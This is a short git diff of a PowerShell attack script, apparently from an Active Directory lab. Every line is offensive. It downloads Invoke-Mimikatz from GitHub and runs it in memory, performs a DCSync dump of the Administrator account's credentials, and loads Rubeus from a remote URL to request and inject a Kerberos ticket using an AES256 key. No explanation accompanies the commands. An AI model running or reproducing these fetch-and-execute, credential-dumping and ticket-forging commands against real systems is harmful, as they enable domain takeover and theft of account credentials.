@@ -8,3 +8,8 @@ $assem = [System.Reflection.Assembly]::Load($data)
 
 iex(New-Object Net.WebClient).DownloadString('https://github.com/K1001011/Public/raw/main/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator /domain:lab.com" "exit"'
+
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Rubeus.Program]::Main("asktgt /user:sbssync /aes256:7c4961dfcc95b7783f01a987b8195f9124f6d3da52c31d6af1dd0d91bc27a770 /opsec /force /createntonly:C:\Windows\System32\cmd.exe /show /ptt".Split())
